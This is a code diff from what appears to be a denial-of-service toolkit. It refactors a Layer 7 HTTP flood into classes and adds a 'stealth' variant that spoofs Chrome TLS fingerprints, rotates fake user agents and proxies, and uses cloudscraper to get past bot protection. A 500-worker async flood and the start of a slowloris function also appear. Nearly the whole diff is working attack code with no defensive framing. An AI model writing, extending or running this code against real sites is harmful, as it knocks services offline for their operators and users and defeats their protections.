@@ -12,6 +12,27 @@ from src.utils.network import get_random_headers, generate_stealth_headers
 from src.utils.system import randomize_timing
 import src.security
 from src.utils.logging import add_system_log
+from .base import AttackBase
+
+# Enhanced L7 libraries
+try:
+    import tls_client
+    TLS_CLIENT_AVAILABLE = True
+except ImportError:
+    TLS_CLIENT_AVAILABLE = False
+
+try:
+    import cloudscraper
+    CLOUDSCRAPER_AVAILABLE = True
+except ImportError:
+    CLOUDSCRAPER_AVAILABLE = False
+
+try:
+    from fake_useragent import UserAgent
+    FAKE_UA_AVAILABLE = True
+    ua = UserAgent()
+except ImportError:
+    FAKE_UA_AVAILABLE = False
 
 async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
     """Extreme performance asynchronous HTTP flood with persistent workers"""
@@ -42,73 +63,242 @@ async def async_http_flood(url, duration, proxies_list, monitor=None, max_reques
         workers = [asyncio.create_task(worker(session)) for _ in range(500)]
         await asyncio.gather(*workers)
 
-def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
-    """Basic HTTP GET flood - Optimized for maximum PPS through raw socket requests where possible"""
-    from src.security import increment_socket_counter, decrement_socket_counter
-    import socket
-    import ssl
+class HTTPFloodAttack(AttackBase):
+    """Layer 7 HTTP Flood Attack - Class-based implementation"""
 
-    end_time = time.time() + duration
-    parsed = urlparse(url)
-    host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == "https" else 80)
-    path = parsed.path or "/"
-    if parsed.query: path += "?" + parsed.query
+    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
+                 max_requests: int = 0, use_tor: bool = False, stealth_mode: bool = False,
+                 proxies: list = None):
+        super().__init__(target, port, threads, duration)
+        self.max_requests = max_requests
+        self.use_tor = use_tor
+        self.stealth_mode = stealth_mode
+        self.proxies = proxies or []
 
-    # Pre-calculate payloads
-    headers = generate_stealth_headers() if stealth_mode else get_random_headers()
-    headers['Host'] = host
-    headers['Connection'] = 'keep-alive'
-    
-    header_str = f"GET {path} HTTP/1.1\r\n"
-    for k, v in headers.items():
-        header_str += f"{k}: {v}\r\n"
-    header_str += "\r\n"
-    payload = header_str.encode()
+        # Attack-specific attributes
+        self.attack_name = "Layer 7 HTTP Flood (Basic)"
+        self.category = "Layer 7"
 
-    while time.time() < end_time and not src.security.stop_event.is_set():
-        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
-            break
+        # Pre-calculated data
+        self.payload = None
+        self.parsed_url = None
 
-        s = None
+    def _setup_attack(self) -> bool:
+        """Setup HTTP flood parameters"""
         try:
-            increment_socket_counter()
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            
-            if parsed.scheme == "https":
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=host)
+            self.parsed_url = urlparse(self.target)
+            if not self.parsed_url.hostname:
+                return False
 
-            s.connect((host, port))
-            
-            # Direct blast with error recovery
-            for _ in range(100):
-                if time.time() >= end_time or src.security.stop_event.is_set(): break
-                try:
-                    s.sendall(payload)
-                    # Don't wait for response, just keep pushing if PPS is the goal
-                    if monitor:
-                        monitor.update_stats(packets=1, bytes_sent=len(payload))
-                except (socket.error, BrokenPipeError):
-                    break # Socket closed, re-connect in outer loop
-                
-                if stealth_mode:
-                    time.sleep(random.uniform(0.01, 0.03))
+            host = self.parsed_url.hostname
+            path = self.parsed_url.path or "/"
+            if self.parsed_url.query:
+                path += "?" + self.parsed_url.query
 
+            # Pre-calculate payload
+            headers = generate_stealth_headers() if self.stealth_mode else get_random_headers()
+            headers['Host'] = host
+            headers['Connection'] = 'keep-alive'
+
+            header_str = f"GET {path} HTTP/1.1\r\n"
+            for k, v in headers.items():
+                header_str += f"{k}: {v}\r\n"
+            header_str += "\r\n"
+            self.payload = header_str.encode()
+
+            return True
         except Exception as e:
-            if monitor:
-                monitor.update_stats(failed=1)
-            time.sleep(0.2) # Avoid aggressive re-connect spam on failure
-        finally:
-            if s:
-                try: s.close()
-                except: pass
-            decrement_socket_counter()
-    
-    src.security.decrement_thread_counter()
+            add_system_log(f"[red]HTTP Flood setup failed: {e}[/red]")
+            return False
+
+    def _create_worker(self):
+        """Create worker function for HTTP flood"""
+        def worker():
+            from src.security import increment_socket_counter, decrement_socket_counter
+            import socket
+            import ssl
+
+            while not self.should_stop:
+                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
+                    break
+
+                s = None
+                try:
+                    increment_socket_counter()
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(3)
+
+                    # Handle HTTPS
+                    if self.parsed_url.scheme == "https":
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        s = ctx.wrap_socket(s, server_hostname=self.parsed_url.hostname)
+
+                    s.connect((self.parsed_url.hostname, self.port))
+
+                    # Send multiple requests per connection
+                    for _ in range(100):
+                        if self.should_stop or (self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests):
+                            break
+
+                        try:
+                            s.sendall(self.payload)
+                            self.metrics.update(packets=1, bytes_sent=len(self.payload))
+
+                            if self.stealth_mode:
+                                time.sleep(random.uniform(0.01, 0.03))
+
+                        except (socket.error, BrokenPipeError):
+                            break  # Socket closed, reconnect
+
+                except Exception:
+                    self.metrics.update(failed=1)
+                    time.sleep(0.2)  # Backoff on failure
+
+                finally:
+                    if s:
+                        try:
+                            s.close()
+                        except:
+                            pass
+                    decrement_socket_counter()
+
+        return worker
+
+    def _cleanup(self):
+        """Cleanup HTTP flood resources"""
+        pass
+
+
+class StealthHTTPFloodAttack(AttackBase):
+    """Enhanced Layer 7 HTTP Flood with TLS-Client for maximum stealth"""
+
+    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
+                 max_requests: int = 0, use_tor: bool = False, stealth_mode: bool = True,
+                 proxies: list = None, use_tls_client: bool = True):
+        super().__init__(target, port, threads, duration)
+        self.max_requests = max_requests
+        self.use_tor = use_tor
+        self.stealth_mode = stealth_mode
+        self.proxies = proxies or []
+        self.use_tls_client = use_tls_client and TLS_CLIENT_AVAILABLE
+
+        # Attack-specific attributes
+        self.attack_name = "Layer 7 Stealth HTTP Flood (TLS-Client)"
+        self.category = "Layer 7"
+
+        # TLS client sessions
+        self.sessions = []
+
+    def _setup_attack(self) -> bool:
+        """Setup enhanced HTTP flood parameters"""
+        try:
+            self.parsed_url = urlparse(self.target)
+            if not self.parsed_url.hostname:
+                return False
+
+            # Initialize TLS client sessions if available
+            if self.use_tls_client:
+                for _ in range(self.threads):
+                    session = tls_client.Session(
+                        client_identifier="chrome112",
+                        random_tls_extension_order=True
+                    )
+                    # Set proxy if available
+                    if self.proxies:
+                        proxy = random.choice(self.proxies)
+                        session.proxies = {"http": proxy, "https": proxy}
+                    self.sessions.append(session)
+
+            return True
+        except Exception as e:
+            add_system_log(f"[red]Stealth HTTP Flood setup failed: {e}[/red]")
+            return False
+
+    def _create_worker(self):
+        """Create worker function for stealth HTTP flood"""
+        def worker():
+            session = None
+            if self.use_tls_client and self.sessions:
+                session = random.choice(self.sessions)
+
+            while not self.should_stop:
+                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
+                    break
+
+                try:
+                    headers = generate_stealth_headers()
+
+                    # Add fake user agent if available
+                    if FAKE_UA_AVAILABLE:
+                        headers['User-Agent'] = ua.random
+
+                    # Use TLS client for maximum stealth
+                    if session:
+                        response = session.get(
+                            self.target,
+                            headers=headers,
+                            timeout_seconds=10
+                        )
+                        self.metrics.update(packets=1, bytes_sent=len(response.content) if response.content else 0)
+                    else:
+                        # Fallback to requests with cloudscraper if available
+                        if CLOUDSCRAPER_AVAILABLE:
+                            scraper = cloudscraper.create_scraper()
+                            response = scraper.get(self.target, headers=headers, timeout=10)
+                        else:
+                            response = requests.get(self.target, headers=headers, timeout=10)
+
+                        self.metrics.update(packets=1, bytes_sent=len(response.content) if response.content else 0)
+
+                    # Stealth timing
+                    if self.stealth_mode:
+                        time.sleep(random.uniform(0.1, 0.5))
+
+                except Exception:
+                    self.metrics.update(failed=1)
+                    time.sleep(0.2)
+
+        return worker
+
+    def _cleanup(self):
+        """Cleanup stealth HTTP flood resources"""
+        self.sessions.clear()
+
+
+# Legacy function for backward compatibility
+def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
+    """Legacy HTTP flood function - now uses class-based implementation"""
+    attack = HTTPFloodAttack(
+        target=url,
+        port=80,  # Will be parsed from URL
+        threads=10,
+        duration=duration,
+        max_requests=max_requests,
+        use_tor=use_tor,
+        stealth_mode=stealth_mode,
+        proxies=proxies
+    )
+
+    # Setup callbacks for legacy monitor compatibility
+    if monitor:
+        def update_legacy_metrics(state, metrics):
+            if state == "running":
+                # Update legacy monitor with current metrics
+                monitor.packets_sent = metrics["packets_sent"]
+                monitor.bytes_sent = metrics["bytes_sent"]
+                monitor.failed = metrics.get("packets_failed", 0)
+
+        attack.on_progress = update_legacy_metrics
+
+    attack.start()
+
+    # Wait for completion
+    while attack.is_running:
+        time.sleep(0.1)
+
+    return attack.metrics.get_summary()
 
 def slowloris_attack(target_ip, target_port, duration, socket_count=500):
     """Slowloris attack - keeps connections open with partial headers"""
